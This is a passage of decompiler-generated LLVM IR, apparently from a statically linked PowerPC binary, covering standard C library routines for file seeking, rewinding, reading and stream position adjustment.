  %v2_100266f8 = add i32 %v1_100266f8, %v0_100266f8
  store i32 %v2_100266f8, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100266fc

dec_label_pc_100266fc:                            ; preds = %dec_label_pc_100266a4, %dec_label_pc_100266c4
  store i32 %v2_10026658, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268592904, i32* @lr, align 4
  %v0_10026704 = call i32 @__pthread_cleanup_pop_restore()
  %v0_1002670c = load i32, i32* %r29.global-to-local, align 4
  ret i32 %v0_1002670c

; uselistorder directives
  uselistorder i32 %v1_100266e4, { 1, 0 }
  uselistorder i32* %r29.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 320, { 1, 0 }
  uselistorder i32* @global_var_1004529c.1387, { 1, 2, 3, 0 }
  uselistorder i32* @global_var_10045298.1388, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1004503c.1250 to i32), { 0, 2, 4, 1, 3 }
  uselistorder label %dec_label_pc_100266fc, { 1, 0 }
  uselistorder label %dec_label_pc_100266c4, { 1, 0 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10026720 = add i32 %arg1, 28
  %v2_10026720 = inttoptr i32 %v1_10026720 to i32*
  %v3_10026720 = load i32, i32* %v2_10026720, align 4
  store i32 %v3_10026720, i32* @global_var_100452a4.1392, align 4
  %v1_10026730 = add i32 %arg1, 44
  %v2_10026730 = inttoptr i32 %v1_10026730 to i32*
  %v3_10026730 = load i32, i32* %v2_10026730, align 4
  store i32 %v3_10026730, i32* @global_var_100452a8.1393, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_100452ac.1282, align 4
  %v0_10026764 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 true, i32 %v0_10026764)
  store i32 12, i32* @r3, align 4
  %v0_1002676c = call i32 @__syscall_error()
  ret i32 %v0_1002676c

; uselistorder directives
  uselistorder i32 ()* @__syscall_error, { 0, 1, 3, 2 }
  uselistorder i1 true, { 12, 13, 5, 9, 6, 1, 11, 0, 2, 15, 7, 8, 3, 10, 14, 4 }
  uselistorder i32* @global_var_100452ac.1282, { 1, 0, 2 }
}

define i32 @__cmsg_nxthdr() local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %v0_10026770 = load i32, i32* @r4, align 4
  %v1_10026770 = inttoptr i32 %v0_10026770 to i32*
  %v2_10026770 = load i32, i32* %v1_10026770, align 4
  %v0_10026774 = load i32, i32* @r3, align 4
  store i32 %v0_10026774, i32* %r11.global-to-local, align 4
  %v1_10026778 = icmp ult i32 %v2_10026770, 11
  %v3_10026778 = icmp eq i32 %v2_10026770, 11
  store i1 %v1_10026778, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10026778, i1* %cr7_eq.global-to-local, align 1
  %v1_1002677c = add i32 %v2_10026770, 3
  store i32 %v1_1002677c, i32* %r0.global-to-local, align 4
  %v1_10026780 = call i32 @__asm_rlwinm(i32 %v1_1002677c, i32 0, i32 0, i32 29)
  %v0_10026784 = load i32, i32* @r4, align 4
  %v2_10026784 = add i32 %v0_10026784, %v1_10026780
  store i32 %v2_10026784, i32* %r3.global-to-local, align 4
  %v1_10026788 = add i32 %v2_10026784, 12
  %v0_1002678c = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_1002678c = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_1002678c = or i1 %v0_1002678c, %v1_1002678c
  br i1 %v2_1002678c, label %dec_label_pc_100267bc, label %dec_label_pc_10026790

dec_label_pc_10026790:                            ; preds = %entry
  %v0_10026790 = load i32, i32* %r11.global-to-local, align 4
  %v1_10026790 = add i32 %v0_10026790, 20
  %v2_10026790 = inttoptr i32 %v1_10026790 to i32*
  %v3_10026790 = load i32, i32* %v2_10026790, align 4
  store i32 %v3_10026790, i32* %r0.global-to-local, align 4
  %v1_10026794 = add i32 %v0_10026790, 16
  %v2_10026794 = inttoptr i32 %v1_10026794 to i32*
  %v3_10026794 = load i32, i32* %v2_10026794, align 4
  %v2_10026798 = add i32 %v3_10026794, %v3_10026790
  store i32 %v2_10026798, i32* %r0.global-to-local, align 4
  %v2_1002679c = icmp ult i32 %v1_10026788, %v2_10026798
  %v3_1002679c = icmp ugt i32 %v1_10026788, %v2_10026798
  %v4_1002679c = icmp eq i32 %v1_10026788, %v2_10026798
  store i1 %v2_1002679c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1002679c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1002679c, label %dec_label_pc_100267bc, label %dec_label_pc_100267a4

dec_label_pc_100267a4:                            ; preds = %dec_label_pc_10026790
  %v3_100267a4 = inttoptr i32 %v2_10026784 to i32*
  %v4_100267a4 = load i32, i32* %v3_100267a4, align 4
  %v1_100267a8 = add i32 %v4_100267a4, 3
  %v1_100267ac = call i32 @__asm_rlwinm(i32 %v1_100267a8, i32 0, i32 0, i32 29)
  %v0_100267b0 = load i32, i32* %r3.global-to-local, align 4
  %v2_100267b0 = add i32 %v0_100267b0, %v1_100267ac
  %v1_100267b4 = load i32, i32* %r0.global-to-local, align 4
  %v2_100267b4 = icmp ult i32 %v2_100267b0, %v1_100267b4
  %v4_100267b4 = icmp eq i32 %v2_100267b0, %v1_100267b4
  store i1 %v2_100267b4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_100267b4, i1* %cr7_eq.global-to-local, align 1
  %v0_100267b8 = load i32, i32* @lr, align 4
  %tmp = icmp ule i32 %v2_100267b0, %v1_100267b4
  call void @__pseudo_cond_branch(i1 %tmp, i32 %v0_100267b8)
  br label %dec_label_pc_100267bc

dec_label_pc_100267bc:                            ; preds = %dec_label_pc_10026790, %entry, %dec_label_pc_100267a4
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_100267b0, { 0, 2, 1 }
  uselistorder i32 %v2_10026798, { 2, 1, 0, 3 }
  uselistorder i32 %v1_10026788, { 2, 1, 0 }
  uselistorder i32 %v2_10026770, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100267bc, { 2, 0, 1 }
}

define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_100267c4 = load i32, i32* @r5, align 4
  store i32 %v0_100267c4, i32* @r7, align 4
  %v0_100267c8 = load i32, i32* @r4, align 4
  %tmp = icmp slt i32 %v0_100267c8, 0
  %v1_100267cc = zext i1 %tmp to i32
  %v2_100267cc = ashr i32 %v0_100267c8, 31
  %v3_100267cc = and i32 %v2_100267cc, -2
  %v4_100267cc = or i32 %v3_100267cc, %v1_100267cc
  %v3_100267d0 = inttoptr i32 %v4_100267cc to i16*
  %v4_100267d0 = call i32 @__GI_fseeko64(i16* %v3_100267d0, i32 %v0_100267c8, i32 %v0_100267c4)
  ret i32 %v4_100267d0

; uselistorder directives
  uselistorder i32 %v0_100267c8, { 1, 2, 0 }
}

define i32 @__GI_rewind(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r30.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_100267dc = call i32 @__asm_mfcr()
  %v2_100267e8 = add i32 %v0_100267dc, 56
  store i32 %v2_100267e8, i32* %r30.global-to-local, align 4
  store i32 %v0_100267dc, i32* @r31, align 4
  %v2_10026800 = add i32 %v0_100267dc, 52
  %v3_10026800 = inttoptr i32 %v2_10026800 to i32*
  %v4_10026800 = load i32, i32* %v3_10026800, align 4
  %v2_10026804 = ptrtoint i32* %stack_var_-40 to i32
  %v3_10026808 = icmp eq i32 %v4_10026800, 0
  store i1 %v3_10026808, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_10026808, label %dec_label_pc_10026810, label %dec_label_pc_1002681c

dec_label_pc_10026810:                            ; preds = %entry
  %v4_10026810 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26856), i32 %v2_100267e8)
  %v0_10026814 = load i32, i32* %r30.global-to-local, align 4
  store i32 268593180, i32* @lr, align 4
  %v1_10026818 = call i32 @pthread_mutex_lock(i32 %v0_10026814)
  %v0_1002681c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1002681c

dec_label_pc_1002681c:                            ; preds = %entry, %dec_label_pc_10026810
  %v0_1002681c = phi i32 [ %v0_100267dc, %entry ], [ %v0_1002681c.pre, %dec_label_pc_10026810 ]
  %v1_1002681c = inttoptr i32 %v0_1002681c to i16*
  %v2_1002681c = load i16, i16* %v1_1002681c, align 2
  %v3_1002681c = zext i16 %v2_1002681c to i32
  store i32 0, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  %v1_1002682c = call i32 @__asm_rlwinm(i32 %v3_1002681c, i32 0, i32 29, i32 27)
  %v2_1002682c = trunc i32 %v1_1002682c to i16
  %v3_10026830 = load i32, i32* @r31, align 4
  %v4_10026830 = inttoptr i32 %v3_10026830 to i16*
  store i16 %v2_1002682c, i16* %v4_10026830, align 2
  store i32 ptrtoint ([3 x i8]* @global_var_10026838.1394 to i32), i32* @lr, align 4
  %v0_10026834 = call i32 @__GI_fseek()
  store i32 %v2_10026804, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v0_10026840 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10026840, label %dec_label_pc_10026844, label %dec_label_pc_10026848

dec_label_pc_10026844:                            ; preds = %dec_label_pc_1002681c
  store i32 268593224, i32* @lr, align 4
  %v0_10026844 = call i32 @__pthread_cleanup_pop_restore()
  store i32 %v0_10026844, i32* @r3, align 4
  br label %dec_label_pc_10026848

dec_label_pc_10026848:                            ; preds = %dec_label_pc_1002681c, %dec_label_pc_10026844
  %v1_10026858 = call %0 @__asm_mtcrf(i32 8, i32 %v0_100267dc)
  %v9_10026858 = extractvalue %0 %v1_10026858, 7
  store i4 %v9_10026858, i4* @cr4, align 1
  %v0_10026860 = load i32, i32* @r3, align 4
  ret i32 %v0_10026860

; uselistorder directives
  uselistorder i32 %v0_100267dc, { 3, 0, 1, 2, 4 }
  uselistorder i4* @cr4, { 1, 2, 7, 4, 5, 0, 3, 8, 6 }
  uselistorder i32 ()* @__GI_fseek, { 1, 0 }
  uselistorder i32 27, { 25, 23, 24, 1, 2, 27, 26, 34, 35, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 37, 38, 33, 39, 28, 29, 40, 30, 31, 32, 0, 36, 41 }
  uselistorder label %dec_label_pc_10026848, { 1, 0 }
  uselistorder label %dec_label_pc_1002681c, { 1, 0 }
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_100268f8 = load i32, i32* @r7, align 4
  %v0_100268fc = load i32, i32* @lr, align 4
  store i32 %v0_100268fc, i32* %r0.global-to-local, align 4
  store i32 %v0_100268f8, i32* @r30, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 %arg2, i32* %stack_var_-56, align 4
  %tmp9 = icmp ult i32 %v0_100268f8, 3
  br i1 %tmp9, label %dec_label_pc_10026934, label %dec_label_pc_10026920

dec_label_pc_10026920:                            ; preds = %entry
  %v0_10026920 = call i32 @__errno_location()
  store i32 -1, i32* @r30, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_1002692c = inttoptr i32 %v0_10026920 to i32*
  store i32 22, i32* %v2_1002692c, align 4
  br label %dec_label_pc_100269fc

dec_label_pc_10026934:                            ; preds = %entry
  %v2_10026934 = add i32 %tmp, 52
  %v3_10026934 = inttoptr i32 %v2_10026934 to i32*
  %v4_10026934 = load i32, i32* %v3_10026934, align 4
  store i32 %v4_10026934, i32* @r28, align 4
  %v3_10026938 = icmp eq i32 %v4_10026934, 0
  br i1 %v3_10026938, label %dec_label_pc_10026940, label %dec_label_pc_10026960

dec_label_pc_10026940:                            ; preds = %dec_label_pc_10026934
  %v2_10026940 = add i32 %tmp, 56
  store i32 %v2_10026940, i32* @r29, align 4
  %v4_10026954 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-48, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26856), i32 %v2_10026940)
  %v0_10026958 = load i32, i32* @r29, align 4
  store i32 268593504, i32* @lr, align 4
  %v1_1002695c = call i32 @pthread_mutex_lock(i32 %v0_10026958)
  %v0_10026960.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10026960

dec_label_pc_10026960:                            ; preds = %dec_label_pc_10026934, %dec_label_pc_10026940
  %v0_1002696c = phi i32 [ %tmp, %dec_label_pc_10026934 ], [ %v0_10026960.pre, %dec_label_pc_10026940 ]
  %v1_10026960 = inttoptr i32 %v0_1002696c to i16*
  %v2_10026960 = load i16, i16* %v1_10026960, align 2
  %v3_10026960 = zext i16 %v2_10026960 to i32
  store i32 %v3_10026960, i32* %r0.global-to-local, align 4
  %v1_10026964 = and i32 %v3_10026960, 64
  store i32 %v1_10026964, i32* %r9.global-to-local, align 4
  %v3_10026964 = icmp eq i32 %v1_10026964, 0
  br i1 %v3_10026964, label %dec_label_pc_1002697c, label %dec_label_pc_1002696c

dec_label_pc_1002696c:                            ; preds = %dec_label_pc_10026960
  store i32 %v0_1002696c, i32* @r3, align 4
  store i32 268593524, i32* @lr, align 4
  %v0_10026970 = call i32 @__stdio_wcommit()
  %v3_10026974 = icmp eq i32 %v0_10026970, 0
  br i1 %v3_10026974, label %dec_label_pc_1002697c, label %dec_label_pc_100269e4

dec_label_pc_1002697c:                            ; preds = %dec_label_pc_1002696c, %dec_label_pc_10026960
  %v0_1002697c = load i32, i32* @r30, align 4
  %v3_1002697c = icmp eq i32 %v0_1002697c, 1
  br i1 %v3_1002697c, label %dec_label_pc_10026984, label %dec_label_pc_1002697c.dec_label_pc_10026998_crit_edge

dec_label_pc_1002697c.dec_label_pc_10026998_crit_edge: ; preds = %dec_label_pc_1002697c
  br label %dec_label_pc_10026998

dec_label_pc_10026984:                            ; preds = %dec_label_pc_1002697c
  %v0_10026984 = load i32, i32* @r31, align 4
  %v1_10026984 = inttoptr i32 %v0_10026984 to i16*
  %v2_10026988 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268593552, i32* @lr, align 4
  %v4_1002698c = call i32 @__stdio_adjust_position(i16* %v1_10026984, i32 %v2_10026988)
  %v1_10026990 = icmp slt i32 %v4_1002698c, 0
  br i1 %v1_10026990, label %dec_label_pc_100269e4, label %dec_label_pc_10026984.dec_label_pc_10026998_crit_edge

dec_label_pc_10026984.dec_label_pc_10026998_crit_edge: ; preds = %dec_label_pc_10026984
  %v0_10026998.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10026998

dec_label_pc_10026998:                            ; preds = %dec_label_pc_1002697c.dec_label_pc_10026998_crit_edge, %dec_label_pc_10026984.dec_label_pc_10026998_crit_edge
  %v0_10026998 = phi i32 [ %v0_1002697c, %dec_label_pc_1002697c.dec_label_pc_10026998_crit_edge ], [ %v0_10026998.pre, %dec_label_pc_10026984.dec_label_pc_10026998_crit_edge ]
  %v0_1002699c = load i32, i32* @r31, align 4
  store i32 268593576, i32* @lr, align 4
  %v5_100269a4 = call i32 @__stdio_seek(i32 %v0_1002699c, i32* nonnull %stack_var_-56, i32 %v0_10026998)
  %v1_100269a8 = icmp slt i32 %v5_100269a4, 0
  br i1 %v1_100269a8, label %dec_label_pc_100269e4, label %dec_label_pc_100269b0

dec_label_pc_100269b0:                            ; preds = %dec_label_pc_10026998
  %v0_100269b0 = load i32, i32* @r31, align 4
  %v1_100269b0 = inttoptr i32 %v0_100269b0 to i16*
  %v2_100269b0 = load i16, i16* %v1_100269b0, align 2
  %v3_100269b0 = zext i16 %v2_100269b0 to i32
  store i32 %v3_100269b0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r11, align 4
  %v1_100269b8 = add i32 %v0_100269b0, 8
  %v2_100269b8 = inttoptr i32 %v1_100269b8 to i32*
  %v3_100269b8 = load i32, i32* %v2_100269b8, align 4
  store i32 %v3_100269b8, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r30, align 4
  %v1_100269c0 = and i32 %v3_100269b0, 65464
  store i32 %v1_100269c0, i32* %r0.global-to-local, align 4
  %v3_100269c4 = add i32 %v0_100269b0, 2
  %v4_100269c4 = inttoptr i32 %v3_100269c4 to i8*
  store i8 0, i8* %v4_100269c4, align 1
  %v0_100269c8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100269c8 = load i32, i32* @r31, align 4
  %v2_100269c8 = add i32 %v1_100269c8, 28
  %v3_100269c8 = inttoptr i32 %v2_100269c8 to i32*
  store i32 %v0_100269c8, i32* %v3_100269c8, align 4
  %v0_100269cc = load i32, i32* %r0.global-to-local, align 4
  %v1_100269cc = trunc i32 %v0_100269cc to i16
  %v2_100269cc = load i32, i32* @r31, align 4
  %v3_100269cc = inttoptr i32 %v2_100269cc to i16*
  store i16 %v1_100269cc, i16* %v3_100269cc, align 2
  %v0_100269d0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100269d0 = load i32, i32* @r31, align 4
  %v2_100269d0 = add i32 %v1_100269d0, 16
  %v3_100269d0 = inttoptr i32 %v2_100269d0 to i32*
  store i32 %v0_100269d0, i32* %v3_100269d0, align 4
  %v0_100269d4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100269d4 = load i32, i32* @r31, align 4
  %v2_100269d4 = add i32 %v1_100269d4, 20
  %v3_100269d4 = inttoptr i32 %v2_100269d4 to i32*
  store i32 %v0_100269d4, i32* %v3_100269d4, align 4
  %v0_100269d8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100269d8 = load i32, i32* @r31, align 4
  %v2_100269d8 = add i32 %v1_100269d8, 24
  %v3_100269d8 = inttoptr i32 %v2_100269d8 to i32*
  store i32 %v0_100269d8, i32* %v3_100269d8, align 4
  %v0_100269dc = load i32, i32* @r11, align 4
  %v1_100269dc = load i32, i32* @r31, align 4
  %v2_100269dc = add i32 %v1_100269dc, 44
  %v3_100269dc = inttoptr i32 %v2_100269dc to i32*
  store i32 %v0_100269dc, i32* %v3_100269dc, align 4
  br label %dec_label_pc_100269e8

dec_label_pc_100269e4:                            ; preds = %dec_label_pc_1002696c, %dec_label_pc_10026998, %dec_label_pc_10026984
  store i32 -1, i32* @r30, align 4
  br label %dec_label_pc_100269e8

dec_label_pc_100269e8:                            ; preds = %dec_label_pc_100269b0, %dec_label_pc_100269e4
  %v0_100269e8 = load i32, i32* @r28, align 4
  %v3_100269e8 = icmp eq i32 %v0_100269e8, 0
  br i1 %v3_100269e8, label %dec_label_pc_100269f0, label %dec_label_pc_100269fc

dec_label_pc_100269f0:                            ; preds = %dec_label_pc_100269e8
  %v2_100269f0 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_100269f0, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268593660, i32* @lr, align 4
  %v0_100269f8 = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_100269fc

dec_label_pc_100269fc:                            ; preds = %dec_label_pc_100269e8, %dec_label_pc_10026920, %dec_label_pc_100269f0
  store i32 %v0_100268fc, i32* %r0.global-to-local, align 4
  %v0_10026a00 = load i32, i32* @r30, align 4
  ret i32 %v0_10026a00

; uselistorder directives
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder i32 22, { 23, 54, 40, 41, 24, 42, 25, 43, 26, 27, 28, 29, 0, 44, 45, 52, 49, 50, 30, 60, 31, 55, 32, 33, 53, 34, 35, 36, 48, 37, 1, 2, 46, 3, 56, 38, 39, 47, 57, 59, 4, 58, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 51, 22 }
  uselistorder label %dec_label_pc_100269fc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100269e8, { 1, 0 }
  uselistorder label %dec_label_pc_100269e4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10026998, { 1, 0 }
  uselistorder label %dec_label_pc_10026960, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_10026a20 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_10026a2c = load i16, i16* %arg1, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10026a34 = and i16 %v3_10026a2c, 4
  %v3_10026a34 = icmp eq i16 %v1_10026a34, 0
  br i1 %v3_10026a34, label %dec_label_pc_10026a3c, label %dec_label_pc_10026a74

dec_label_pc_10026a3c:                            ; preds = %entry
  %tmp10 = icmp sgt i32 %arg2, -1
  br i1 %tmp10, label %dec_label_pc_10026a48, label %dec_label_pc_10026a40

dec_label_pc_10026a40:                            ; preds = %dec_label_pc_10026a3c
  br label %dec_label_pc_10026a48

dec_label_pc_10026a48:                            ; preds = %dec_label_pc_10026a3c, %dec_label_pc_10026a40
  %v1_10026a48 = add i32 %tmp, 4
  %v2_10026a48 = inttoptr i32 %v1_10026a48 to i32*
  %v3_10026a48 = load i32, i32* %v2_10026a48, align 4
  store i32 %v3_10026a48, i32* %r3.global-to-local, align 4
  store i32 268593744, i32* @lr, align 4
  %v1_10026a4c = call i32 @__libc_read(i32 %v3_10026a48)
  store i32 %v1_10026a4c, i32* %r3.global-to-local, align 4
  %v2_10026a50 = icmp sgt i32 %v1_10026a4c, 0
  br i1 %v2_10026a50, label %dec_label_pc_10026a74, label %dec_label_pc_10026a58

dec_label_pc_10026a58:                            ; preds = %dec_label_pc_10026a48
  %v3_10026a50 = icmp eq i32 %v1_10026a4c, 0
  %v0_10026a58 = load i32, i32* @r31, align 4
  %v1_10026a58 = inttoptr i32 %v0_10026a58 to i16*
  %v2_10026a58 = load i16, i16* %v1_10026a58, align 2
  br i1 %v3_10026a50, label %dec_label_pc_10026a60, label %dec_label_pc_10026a68

dec_label_pc_10026a60:                            ; preds = %dec_label_pc_10026a58
  %v1_10026a60 = or i16 %v2_10026a58, 4
  br label %dec_label_pc_10026a70

dec_label_pc_10026a68:                            ; preds = %dec_label_pc_10026a58
  %v1_10026a68 = or i16 %v2_10026a58, 8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10026a70

dec_label_pc_10026a70:                            ; preds = %dec_label_pc_10026a60, %dec_label_pc_10026a68
  %v1_10026a60.sink.off0 = phi i16 [ %v1_10026a60, %dec_label_pc_10026a60 ], [ %v1_10026a68, %dec_label_pc_10026a68 ]
  store i16 %v1_10026a60.sink.off0, i16* %v1_10026a58, align 2
  %v0_10026a84.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10026a74

dec_label_pc_10026a74:                            ; preds = %entry, %dec_label_pc_10026a48, %dec_label_pc_10026a70
  %v0_10026a84 = phi i32 [ 0, %entry ], [ %v1_10026a4c, %dec_label_pc_10026a48 ], [ %v0_10026a84.pre, %dec_label_pc_10026a70 ]
  store i32 %v0_10026a20, i32* @r31, align 4
  ret i32 %v0_10026a84

; uselistorder directives
  uselistorder i16 %v2_10026a58, { 1, 0 }
  uselistorder i32 %v1_10026a4c, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 1, 4, 5, 0 }
  uselistorder i32 (i32)* @__libc_read, { 0, 4, 3, 2, 1, 5 }
  uselistorder label %dec_label_pc_10026a74, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10026a70, { 1, 0 }
  uselistorder label %dec_label_pc_10026a48, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg2, i32* @r8, align 4
  %v3_10026aa0 = load i16, i16* %arg1, align 2
  %v4_10026aa0 = zext i16 %v3_10026aa0 to i32
  store i32 %v4_10026aa0, i32* @r11, align 4
  %tmp9 = urem i16 %v3_10026aa0, 4
  %v3_10026aa4 = icmp eq i16 %tmp9, 0
  br i1 %v3_10026aa4, label %dec_label_pc_10026af0, label %dec_label_pc_10026aac

dec_label_pc_10026aac:                            ; preds = %entry
  %v1_10026aa4 = zext i16 %tmp9 to i32
  %v1_10026aac = add nsw i32 %v1_10026aa4, -1
  store i32 %v1_10026aac, i32* @r10, align 4
  %v4_10026aac = icmp eq i32 %v1_10026aac, 0
  br i1 %v4_10026aac, label %dec_label_pc_10026af0, label %dec_label_pc_10026ab4

dec_label_pc_10026ab4:                            ; preds = %dec_label_pc_10026aac
  %v1_10026ab4 = and i32 %v4_10026aa0, 2048
  %v3_10026ab4 = icmp eq i32 %v1_10026ab4, 0
  br i1 %v3_10026ab4, label %dec_label_pc_10026af0, label %dec_label_pc_10026abc

dec_label_pc_10026abc:                            ; preds = %dec_label_pc_10026ab4
  %v2_10026abc = icmp sgt i32 %v1_10026aac, 1
  br i1 %v2_10026abc, label %dec_label_pc_10026b68, label %dec_label_pc_10026ac4

dec_label_pc_10026ac4:                            ; preds = %dec_label_pc_10026abc
  %v2_10026ac4 = add i32 %tmp, 40
  %v3_10026ac4 = inttoptr i32 %v2_10026ac4 to i32*
  %v4_10026ac4 = load i32, i32* %v3_10026ac4, align 4
  %v3_10026ac8 = icmp eq i32 %v4_10026ac4, 0
  br i1 %v3_10026ac8, label %dec_label_pc_10026ad0, label %dec_label_pc_10026b68

dec_label_pc_10026ad0:                            ; preds = %dec_label_pc_10026ac4
  %v2_10026ad0 = add i32 %tmp, 44
  %v3_10026ad0 = inttoptr i32 %v2_10026ad0 to i32*
  %v4_10026ad0 = load i32, i32* %v3_10026ad0, align 4
  %v2_10026ad4 = add i32 %tmp, 3
  %v3_10026ad4 = inttoptr i32 %v2_10026ad4 to i8*
  %v4_10026ad4 = load i8, i8* %v3_10026ad4, align 1
  %v5_10026ad4 = zext i8 %v4_10026ad4 to i32
  %v2_10026adc = sub nsw i32 %v1_10026aac, %v5_10026ad4
  %v1_10026ae0 = add nsw i32 %v2_10026adc, -1
  %tmp7 = icmp slt i32 %v4_10026ad0, 1
  br i1 %tmp7, label %dec_label_pc_10026af0, label %dec_label_pc_10026ae8

dec_label_pc_10026ae8:                            ; preds = %dec_label_pc_10026ad0
  %v2_10026ae8 = add i32 %tmp, 2
  %v3_10026ae8 = inttoptr i32 %v2_10026ae8 to i8*
  %v4_10026ae8 = load i8, i8* %v3_10026ae8, align 1
  %v5_10026ae8 = zext i8 %v4_10026ae8 to i32
  %v2_10026aec = sub nsw i32 %v1_10026ae0, %v5_10026ae8
  br label %dec_label_pc_10026af0

dec_label_pc_10026af0:                            ; preds = %dec_label_pc_10026ad0, %dec_label_pc_10026ab4, %dec_label_pc_10026aac, %entry, %dec_label_pc_10026ae8
  %v0_10026b14 = phi i32 [ %v1_10026ae0, %dec_label_pc_10026ad0 ], [ %v1_10026aac, %dec_label_pc_10026ab4 ], [ 0, %dec_label_pc_10026aac ], [ 0, %entry ], [ %v2_10026aec, %dec_label_pc_10026ae8 ]
  %v1_10026af0 = and i32 %v4_10026aa0, 64
  %v3_10026af0 = icmp eq i32 %v1_10026af0, 0
  %storemerge.in.in.v = select i1 %v3_10026af0, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_10026b04 = add i32 %tmp, 16
  %v3_10026b04 = inttoptr i32 %v2_10026b04 to i32*
  %v4_10026b04 = load i32, i32* %v3_10026b04, align 4
  %v1_10026b08 = inttoptr i32 %arg2 to i32*
  %v2_10026b08 = load i32, i32* %v1_10026b08, align 4
  store i32 %v2_10026b08, i32* %r4.global-to-local, align 4
  %v2_10026b0c = sub i32 %storemerge, %v4_10026b04
  %v1_10026b10 = add i32 %arg2, 4
  %v2_10026b10 = inttoptr i32 %v1_10026b10 to i32*
  %v3_10026b10 = load i32, i32* %v2_10026b10, align 4
  store i32 %v3_10026b10, i32* %r5.global-to-local, align 4
  %v2_10026b14 = add i32 %v2_10026b0c, %v0_10026b14
  store i32 %v2_10026b14, i32* %r31.global-to-local, align 4
  %tmp10 = icmp slt i32 %v2_10026b14, 0
  %v1_10026b1c = zext i1 %tmp10 to i32
  %v2_10026b1c = ashr i32 %v2_10026b14, 31
  %v3_10026b1c = and i32 %v2_10026b1c, -2
  %v4_10026b1c = or i32 %v3_10026b1c, %v1_10026b1c
  %v2_10026b20 = sub i32 %v3_10026b10, %v2_10026b14
  %v3_10026b20 = sub i32 -1, %v2_10026b14
  store i32 %v2_10026b20, i32* @r10, align 4
  %v6_10026b20 = icmp ule i32 %v2_10026b20, %v3_10026b20
